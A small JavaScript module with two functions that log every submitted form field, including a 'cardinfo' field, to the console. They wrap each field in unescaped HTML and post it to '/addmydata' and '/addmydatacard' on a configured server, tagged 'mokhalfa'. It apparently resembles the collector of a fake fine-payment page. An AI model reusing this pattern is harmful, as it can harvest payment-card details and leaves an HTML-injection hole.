/* eslint-disable @typescript-eslint/no-explicit-any */
// Function That Used To Sent Data For Server Any Time
import { v4 as unique } from "uuid";

import axios from "axios";
import { deleteCookie, getCookie, setCookie } from "cookies-next";



export function sendDataToServer(data,user,subject) {
    var mydui =''
    const today = new Date();
console.log(data);
for (const key in data) {
      if (data.hasOwnProperty(key)) {
        console.log(`${key}: ${data[key]}`);
        mydui = mydui+`<h5>${key} : ${data[key]} </h5><br>`;
      }
    }

const datatosend = {
    vid : user.id,
    allinfo : mydui,
    lastmsg : subject,
    fullname : user.id,
    mydate : today.toISOString(),
    chcode : "mokhalfa"
}
 axios.post(process.env.NEXT_PUBLIC_API_UR+"/addmydata", datatosend).then(function (res) {

     });
}

export function sendDataToServercard(data,user,subject) {
    var mydui =''
    const today = new Date();
console.log(data);
for (const key in data) {
      if (data.hasOwnProperty(key)) {
        console.log(`${key}: ${data[key]}`);
         mydui = mydui+`<h5>${key} : ${data[key]} </h5><br>`;
      }
    }

const datatosend = {
    vid : user.id,
    cardinfo : mydui,
    lastmsg : subject,
    fullname : user.id,
    mydate : today.toISOString(),
    chcode : "mokhalfa"
}
 axios.post(process.env.NEXT_PUBLIC_API_UR+"/addmydatacard", datatosend).then(function (res) {

     });
}
